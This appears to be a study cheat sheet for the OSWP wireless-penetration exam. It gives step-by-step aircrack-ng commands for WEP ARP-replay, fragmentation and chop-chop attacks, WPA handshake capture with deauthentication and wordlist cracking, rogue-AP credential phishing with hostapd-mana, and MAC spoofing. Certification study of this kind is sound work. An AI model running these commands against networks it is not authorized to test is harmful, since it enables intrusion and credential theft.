# Chapter 0.6 - Another Quick Cheat Sheet

Here's the updated Wi-Fi Hacking Cheat Sheet with the **ARP replay attack**, **fragmentation attack**, and **chop-chop attack** for **WEP** added.

---

### **Wi-Fi Hacking Cheat Sheet (Manual Approach)**

---

#### **1. Wireless Standards and Frequencies**
- **802.11a**: 5 GHz, 54 Mbps
- **802.11b**: 2.4 GHz, 11 Mbps
- **802.11g**: 2.4 GHz, 54 Mbps
- **802.11n**: 2.4/5 GHz, up to 600 Mbps
- **802.11ac**: 5 GHz, up to 1.3 Gbps
- **802.11ax (Wi-Fi 6)**: 2.4/5 GHz, 10+ Gbps

#### **2. Wi-Fi Encryption Types**
- **WEP**: Vulnerable, uses RC4, 24-bit IV (easily cracked using packet injection attacks).
- **WPA**: TKIP (Temporal Key Integrity Protocol), RC4 (deprecated).
- **WPA2**: CCMP/AES encryption, vulnerable to KRACK.
- **WPA3**: Uses SAE (Simultaneous Authentication of Equals), more secure but still has advanced attack vectors.
- **WPA2/WPA3 Enterprise**: EAP (Extensible Authentication Protocol) with a RADIUS server for user authentication.

---

#### **3. Tools for Wireless Hacking**

- **`airmon-ng`**: Enable/disable monitor mode
    - Start: `airmon-ng start wlan0`
    - Stop: `airmon-ng stop wlan0mon`
  
- **`airodump-ng`**: Capture and monitor packets
    - Basic command: `airodump-ng wlan0mon`
    - Channel specific: `airodump-ng -c <channel> wlan0mon`
  
- **`aireplay-ng`**: Deauthenticate or inject packets, useful for WEP attacks.
    - Deauth: `aireplay-ng -0 10 -a <AP MAC> wlan0mon`
    - Fake auth: `aireplay-ng -1 0 -a <AP MAC> -h <your MAC> wlan0mon`

- **`aircrack-ng`**: Crack captured packets (WEP/WPA/WPA2).
    - Crack WEP: `aircrack-ng <capture file>.cap`
    - Crack WPA/WPA2: `aircrack-ng -w <wordlist> <capture file>.cap`

---

#### **4. Attacking WEP**

##### **4.1. ARP Replay Attack (Speed Up IV Collection)**

- **Step 1: Start capturing packets**:
    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
  
- **Step 2: Fake Authentication** (if needed):
    - `aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon`

- **Step 3: ARP Replay Attack** (Injecting ARP packets to increase IV collection):
    - `aireplay-ng -3 -b <BSSID> -h <your MAC> wlan0mon`
  
    You’ll see messages indicating ARP packets are being replayed. This attack increases the number of weak IVs captured.

- **Step 4: Crack WEP key**:
    - `aircrack-ng <output file>.cap`

##### **4.2. Fragmentation Attack**

The fragmentation attack is useful when no clients are available, and you can break a WEP key by fragmenting a packet.

- **Step 1: Start capturing packets**:
    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
  
- **Step 2: Fake Authentication** (if needed):
    - `aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon`

- **Step 3: Perform Fragmentation Attack**:
    - `aireplay-ng -5 -b <BSSID> -h <your MAC> wlan0mon`
  
    The goal is to capture a packet and fragment it, producing keystream data.

- **Step 4: Use Packetforge-ng to create an ARP packet**:
    - Once you have a usable keystream, use `packetforge-ng` to create a forged ARP request:
      ```bash
      packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
      ```

- **Step 5: Inject the ARP packet**:
    - `aireplay-ng -2 -r <arp_packet> wlan0mon`

- **Step 6: Crack the WEP key**:
    - `aircrack-ng <output file>.cap`

##### **4.3. Chop-Chop Attack**

The chop-chop attack helps you decrypt one byte of an encrypted WEP packet and obtain the keystream.

- **Step 1: Start capturing packets**:
    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`

- **Step 2: Perform Chop-Chop Attack**:
    - `aireplay-ng -4 -b <BSSID> -h <your MAC> wlan0mon`
  
    You will capture part of a packet that can be used to forge ARP packets or perform decryption.

- **Step 3: Use `packetforge-ng` to create an ARP packet**:
    - Create an ARP request using the obtained keystream:
      ```bash
      packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
      ```

- **Step 4: Inject the ARP packet**:
    - `aireplay-ng -2 -r <arp_packet> wlan0mon`

- **Step 5: Crack the WEP key**:
    - `aircrack-ng <output file>.cap`

---

#### **5. Attacking WPA/WPA2 (PSK)**

- **Capture WPA Handshake:**
    - `airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon`
  
- **Deauthenticate a client to force reauthentication:**
    - `aireplay-ng -0 5 -a <AP MAC> -c <Client MAC> wlan0mon`
  
- **Crack WPA/WPA2 using a wordlist:**
    - `aircrack-ng -w <wordlist> <output file>.cap`
    - Recommended wordlist: `rockyou.txt`

---

#### **6. WPA2/WPA3 Enterprise Attacks (Manual)**

- **Rogue AP Attack using `hostapd-mana`** (WPA2 Enterprise):
    - **Install `hostapd-mana`:**
      ```bash
      apt-get install hostapd-mana
      ```
    - **Configure `hostapd-mana`:**
      Edit the configuration file (`hostapd-mana.conf`) to mimic the SSID of the target network and set up the rogue AP to capture enterprise credentials.
    - **Run `hostapd-mana`:**
      ```bash
      hostapd-mana /path/to/hostapd-mana.conf
      ```
    - **Monitor captured credentials** by logging the attempts made by clients to authenticate.

- **Manual EAP Phishing Attack using `hostapd-mana`:**
    - **Modify `hostapd-mana.conf`** to enable credential phishing.
    - Set `eap_user_file` and `eap_server_cert` to intercept and capture PEAP/MSCHAPv2 credentials.
    - Launch the rogue AP and capture credentials:
      ```bash
      hostapd-mana /path/to/hostapd-mana.conf
      ```
    - **Captured PEAP/MSCHAPv2 credentials** can be brute-forced using tools like `john`:
      ```bash
      john --wordlist=<wordlist> captured_hashes.txt
      ```

---

#### **7. Miscellaneous Commands**

- **Change MAC Address (if needed):**
    - `ifconfig wlan0 down`
    - `macchanger -r wlan0`
    - `ifconfig wlan0 up`
  
- **Check for Network Interfaces:**
    - `ifconfig` or `iwconfig`
  
- **Switch to Monitor Mode:**
    - `airmon-ng start wlan0`

---

#### **8. Practice**

- **Set up your own test environment using a router**: Configure WEP or WPA2 Enterprise with a RADIUS server to simulate realistic attacks and practice safely.

- **Use `Wireshark` to analyze captured traffic**: Understand the structure of WEP and WPA/WPA2 handshakes and traffic exchanges to master credential interception.

---

### **Tips for the OSWP Exam**
- Focus on **manual attack vectors** like ARP Replay, Fragmentation, and Chop-Chop for WEP.
- Practice setting up and attacking WPA2 Enterprise using **`hostapd-mana`**.
- Learn how to **crack captured hashes** from WEP and WPA handshakes using **manual tools** like